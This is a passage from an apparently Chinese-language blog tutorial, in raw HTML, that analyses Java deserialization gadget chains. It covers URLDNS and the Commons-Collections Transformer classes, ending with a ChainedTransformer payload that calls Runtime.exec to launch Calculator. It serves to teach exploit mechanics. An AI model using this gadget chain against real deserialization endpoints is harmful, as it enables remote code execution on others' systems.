class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>```</pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>有一个 hash 方法，ctrl + 单击进入看看</p>\n<p>hash 方法调用了 key 的 hashcode（）方法：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">int</span> <span class=\"token function\">hash</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> key<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">int</span> h<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>key <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token number\">0</span> <span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">=</span> key<span class=\"token punctuation\">.</span><span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">>>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>URLDNS 中使⽤的这个 key 是⼀个 java.net.URL 对象，我们看看其 hashCode ⽅法：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">protected</span> <span class=\"token keyword\">int</span> <span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">URL</span> u<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">int</span> h <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token comment\">// Generate the protocol part.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token class-name\">String</span> protocol <span class=\"token operator\">=</span> u<span class=\"token punctuation\">.</span><span class=\"token function\">getProtocol</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>protocol <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> h <span class=\"token operator\">+=</span> protocol<span class=\"token punctuation\">.</span><span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> <span class=\"token comment\">// Generate the host part.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> <span class=\"token class-name\">InetAddress</span> addr <span class=\"token operator\">=</span> <span class=\"token function\">getHostAddress</span><span class=\"token punctuation\">(</span>u<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>调用 getHostAddress 方法，继续跟进：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">protected</span> <span class=\"token keyword\">synchronized</span> <span class=\"token class-name\">InetAddress</span> <span class=\"token function\">getHostAddress</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">URL</span> u<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>u<span class=\"token punctuation\">.</span>hostAddress <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">return</span> u<span class=\"token punctuation\">.</span>hostAddress<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token class-name\">String</span> host <span class=\"token operator\">=</span> u<span class=\"token punctuation\">.</span><span class=\"token function\">getHost</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>host <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">||</span> host<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> u<span class=\"token punctuation\">.</span>hostAddress <span class=\"token operator\">=</span> <span class=\"token class-name\">InetAddress</span><span class=\"token punctuation\">.</span><span class=\"token function\">getByName</span><span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">UnknownHostException</span> ex<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">SecurityException</span> se<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> <span class=\"token keyword\">return</span> u<span class=\"token punctuation\">.</span>hostAddress<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>这⾥ InetAddress.getByName (host) 的作⽤是根据主机名，获取其 IP 地址，在⽹络上其实就是⼀次</p>\n<p>DNS 查询。到这⾥就不必要再跟了。</p>\n<p>只需要初始化⼀个 java.net.URL 对象，作为 key 放在 java.util.HashMap</p>\n<p>中；然后，设置这个 URL 对象的 hashCode 为初始值 -1 ，这样反序列化时将会重新计算</p>\n<p>其 hashCode ，才能触发到后⾯的 DNS 请求，否则不会调⽤ URL-&gt;hashCode () 。</p>\n<p>一条一条分析，从反序列化开始，一直往前面找可以自动执行前面代码的代码就可以了</p>\n<h2 id=\"commoncollections利用链\"><a class=\"anchor\" href=\"#commoncollections利用链\">#</a> Common\u0002Collections 利⽤链：</h2>\n<p>涉及的几个接口和类：</p>\n<h3 id=\"1transformedmap-transformedmap用于对java标准数据结构map做一个修饰被修饰过的map在添加新的元素时可以执行一个回调我们通过下面这行代码对innermap进行修饰传出的outermap即是修饰后的map\"><a class=\"anchor\" href=\"#1transformedmap-transformedmap用于对java标准数据结构map做一个修饰被修饰过的map在添加新的元素时可以执行一个回调我们通过下面这行代码对innermap进行修饰传出的outermap即是修饰后的map\">#</a> 1.TransformedMap:  TransformedMap 用于对 java 标准数据结构 Map 做一个修饰，被修饰过的 Map 在添加新的元素时，可以执行一个回调，我们通过下⾯这⾏代码对 innerMap 进⾏修饰，传出的 outerMap 即是修饰后的 Map：</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Map</span> outerMap <span class=\"token operator\">=</span> <span class=\"token class-name\">TransformedMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>innerMap<span class=\"token punctuation\">,</span> keyTransformer<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>valueTransformer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>其中，keyTransformer 是处理新元素的 Key 的回调，valueTransformer 是处理新元素的 value 的回调。</p>\n<p>我们这⾥所说的” 回调 “，并不是传统意义上的⼀个回调函数，⽽是⼀个实现了 Transformer 接⼝的类。</p>\n<p>理解：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Map</span> outerMap <span class=\"token operator\">=</span> <span class=\"token class-name\">TransformedMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>innerMap<span class=\"token punctuation\">,</span> keyTransformer<span class=\"token punctuation\">,</span> valueTransformer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p><strong>&quot;新元素&quot;</strong> 就是你通过  <code>outerMap.put()</code>  插入的每一个键值对，而 <strong>回调</strong> 是指在插入新元素时， <code>keyTransformer</code>  和  <code>valueTransformer</code>  自动被调用，对键和值进行转换。</p>\n<h3 id=\"2transformer\"><a class=\"anchor\" href=\"#2transformer\">#</a> 2.Transformer:</h3>\n<p>Transformer 是一个接口，他只有一个待实现的方法</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">interface</span> <span class=\"token class-name\">Transformer</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>TransformedMap 在转换 Map 的新元素时，就会调⽤ transform ⽅法，这个过程就类似在调⽤⼀个” 回调</p>\n<p>函数 “，这个回调的参数是原始对象。</p>\n<h3 id=\"constanttransformer\"><a class=\"anchor\" href=\"#constanttransformer\">#</a> ConstantTransformer:</h3>\n<p>ConstantTransformer 是实现了 Transformer 接口的一个类，它的过程就是在构造函数的时候传⼊⼀个对象，并在 transform ⽅法将这个对象再返回</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> constantToReturn<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> iConstant <span class=\"token operator\">=</span> constantToReturn<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> <span class=\"token keyword\">return</span> iConstant<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>所以他的作⽤其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作</p>\n<h3 id=\"3invokertranformer\"><a class=\"anchor\" href=\"#3invokertranformer\">#</a> 3.InvokerTranformer：</h3>\n<h3 id=\"invokertransformer是实现了transformer接口的一个类这个类可以用来执行任意方法这也是反序列化能执行任意代码的关键\"><a class=\"anchor\" href=\"#invokertransformer是实现了transformer接口的一个类这个类可以用来执行任意方法这也是反序列化能执行任意代码的关键\">#</a> InvokerTransformer 是实现了 Transformer 接口的一个类，这个类可以用来执行任意方法，这也是反序列化能执行任意代码的关键</h3>\n<p>在实例化这个 InvokerTransformer 时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数</p>\n<p>是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> methodName<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> paramTypes<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> iMethodName <span class=\"token operator\">=</span> methodName<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> iParamTypes <span class=\"token operator\">=</span> paramTypes<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> iArgs <span class=\"token operator\">=</span> args<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<p>后⾯的回调 transform ⽅法，就是执⾏了 input 对象的 iMethodName ⽅法：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>input <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> <span class=\"token class-name\">Class</span> cls <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> <span class=\"token class-name\">Method</span> method <span class=\"token operator\">=</span> cls<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span>iMethodName<span class=\"token punctuation\">,</span> iParamTypes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> <span class=\"token keyword\">return</span> method<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">,</span> iArgs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">NoSuchMethodException</span> ex<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FunctorException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"InvokerTransformer: The method '\"</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>iMethodName <span class=\"token operator\">+</span> <span class=\"token string\">\"' on '\"</span> <span class=\"token operator\">+</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"' does not exist\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IllegalAccessException</span> ex<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FunctorException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"InvokerTransformer: The method '\"</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>iMethodName <span class=\"token operator\">+</span> <span class=\"token string\">\"' on '\"</span> <span class=\"token operator\">+</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"' cannot be accessed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre> <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InvocationTargetException</span> ex<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FunctorException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"InvokerTransformer: The method '\"</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>iMethodName <span class=\"token operator\">+</span> <span class=\"token string\">\"' on '\"</span> <span class=\"token operator\">+</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"' threw an exception\"</span><span class=\"token punctuation\">,</span> ex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<h3 id=\"chainedtransformer\"><a class=\"anchor\" href=\"#chainedtransformer\">#</a> ChainedTransformer</h3>\n<p>ChainedTransformer 也是实现了 Transformer 接口的一个类，他的作用是将内部的多个 Transformer 串在一起通俗来说就是，前一个回调返回的结果，作为后一个回调的参数传入，用一个图示意</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/8a1a1ed3d0c14cca8ac0804e6c76b4f0.png\" alt=\"img\" /><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" />编辑</p>\n<h3 id=\"代码\"><a class=\"anchor\" href=\"#代码\">#</a> 代码：</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformers<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> iTransformers <span class=\"token operator\">=</span> transformers<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> object<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> iTransformers<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> object <span class=\"token operator\">=</span> iTransformers<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>object<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token keyword\">return</span> object<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<h3 id=\"开始理解payload\"><a class=\"anchor\" href=\"#开始理解payload\">#</a> 开始理解 payload：</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformers <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token class-name\">Transformer</span> transformerChain <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>transformers<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\" /></p>\n<h3 id=\"这里就是先创建一个chainedtransformer其中包含两个transformer第一个是constanttransformer直接返回当前环境的runtime对象第二个是invokertransformer执行runtime对象的exec方法参数是-systemapplicationscalculatorappcontentsmacoscalculator\"><a class=\"anchor\" href=\"#这里就是先创建一个chainedtransformer其中包含两个transformer第一个是constanttransformer直接返回当前环境的runtime对象第二个是invokertransformer执行runtime对象的exec方法参数是-systemapplicationscalculatorappcontentsmacoscalculator\">#</a> 这里就是先创建一个 ChainedTransformer，其中包含两个 Transformer：第一个是 ConstantTransformer，直接返回当前环境的 Runtime 对象；第二个是 InvokerTransformer，执行 Runtime 对象的 exec 方法，参数是 /System/Applications/Calculator.app/Contents/MacOS/Calculator</h3>\n<h3 id=\"当然这个chainedtransformer只是一系列回调我们需要用其来包装innermap使用的前面说到的transformedmapdecorate\"><a class=\"anchor\" href=\"#当然这个chainedtransformer只是一系列回调我们需要用其来包装innermap使用的前面说到的transformedmapdecorate\">#</a> 当然，这个 Chainedtransformer 只是一系列回调，我们需要用其来包装 innerMap，使用的前面说到的 TransformedMap.decorate:</h3>\n<figure class=\"highlight java\"><figcaption 